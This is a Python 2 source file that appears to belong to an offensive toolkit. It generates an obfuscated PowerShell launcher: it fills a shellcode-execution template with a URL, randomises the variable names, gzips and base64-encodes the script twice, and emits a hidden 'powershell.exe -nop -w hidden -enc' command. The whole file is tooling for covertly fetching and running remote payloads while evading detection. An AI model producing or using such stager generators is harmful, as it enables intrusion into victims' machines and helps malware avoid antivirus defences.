import base64
import os
import time
import gzip
import tempfile
import random
import string

def generate_powershell(powershell, url):
    stage1 = ""
    stage1 = load_file("core/util/exec-sc-rand.ps1").replace("[URL]", url)
    for i in reversed(range(1, 12)):
        stage1 = stage1.replace("var" + str(i), gen_str(random.randrange(3, 10)))
        
    path = write_file(stage1)
    stage1 = read_file(path).replace("A", "!")
    delete_file(path)
    stage2 = load_file("core/util/base64.ps1").replace("[BASE64]", stage1)
    for i in range(1,3):
        stage2 = stage2.replace("VAR" + str(i), gen_str(random.randrange(3, 10)))
    
    data = "powershell.exe -nop -w hidden -enc %s" % convert_to_unicode(stage2)
    open(powershell, "wb").write(data)
    print "Powershell output has been saved. (%s/%s)" %  (os.getcwd(), powershell)
    
def gen_str(size):
    return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size)) 
    
def load_file(path):
    path = os.getcwd() + "/" + path
    if os.path.exists(path):
        return open(path, "rb").read()
    else:
        return False
    
def convert_to_unicode(data, do_base64 = True):
    unicode_string = ""
    for char in data:
        unicode_string += char + "\x00"
    
    if do_base64:
        return base64.b64encode(unicode_string)
    return unicode_string

def write_file(data):
    path = tempfile.gettempdir() + "/" + str(time.time())
    fd = gzip.open(path, "wb")
    fd.write(data)
    fd.close()
    return path
    
def delete_file(path):
    os.unlink(path)
    
def read_file(path):
    return base64.b64encode(open(path, "rb").read())
